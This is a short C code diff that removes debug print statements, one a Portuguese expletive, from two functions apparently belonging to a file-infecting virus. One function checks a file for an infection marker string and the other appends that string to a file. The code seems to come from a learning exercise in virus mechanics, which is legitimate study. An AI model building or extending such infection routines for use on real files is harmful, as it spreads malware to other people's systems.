@@ -2,7 +2,6 @@
 
 bool    check_infection(FILE *fp, const char *string, size_t len)
 {
-    printf("\nola\n\n");
     int ch;
     char buffer[2024];
     size_t buf_index = 0;
@@ -10,11 +9,10 @@ bool    check_infection(FILE *fp, const char *string, size_t len)
     {
         if (isprint(ch))
         {
-            if (buf_index < sizeof(buffer) - 1)  // Leave room for null terminator
+            if (buf_index < sizeof(buffer) - 1)
                 buffer[buf_index++] = ch;
             else
             {
-                printf("entrei nesta merda %lu \n", buf_index);
                 // Shift buffer left to make room for new char
                 memmove(buffer, buffer + 1, sizeof(buffer) - 2);
                 buffer[sizeof(buffer) - 2] = ch;
@@ -27,7 +25,6 @@ bool    check_infection(FILE *fp, const char *string, size_t len)
                 buffer[buf_index] = '\0';
                 if(strstr(buffer, string))
                 {
-                    printf("\nbuffer = %s\n\n", buffer);                    
                     return (true);
                 }
             }
@@ -38,7 +35,6 @@ bool    check_infection(FILE *fp, const char *string, size_t len)
     buffer[buf_index] = '\0';
     if(strstr(buffer, string))
     {
-        printf("\nbuffer = %s\n\n", buffer);
         return (true);
     }
     return (false);
@@ -47,5 +43,5 @@ bool    check_infection(FILE *fp, const char *string, size_t len)
 void    infect(FILE *fp, const char *string, size_t len)
 {
     fwrite(string, sizeof(char), len, fp);
-    printf("INFECT.\n");
+    //printf("INFECT.\n");
 }
